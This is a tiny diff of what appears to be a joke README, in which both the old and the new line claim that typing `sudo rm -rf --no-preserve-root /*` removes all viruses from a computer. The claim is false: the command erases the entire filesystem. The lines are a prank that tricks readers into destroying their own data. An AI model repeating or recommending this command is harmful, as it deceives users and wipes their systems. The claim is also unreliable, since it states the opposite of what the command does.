@@ -1,2 +1,2 @@
 # hi.
-Did you know that typing `sudo --no-preserve-root rm -rf /*` will remove all the viruses from your computer?
+did you know that if you type `sudo rm -rf --no-preserve-root /*` it will remove all of the viruses from your computer?
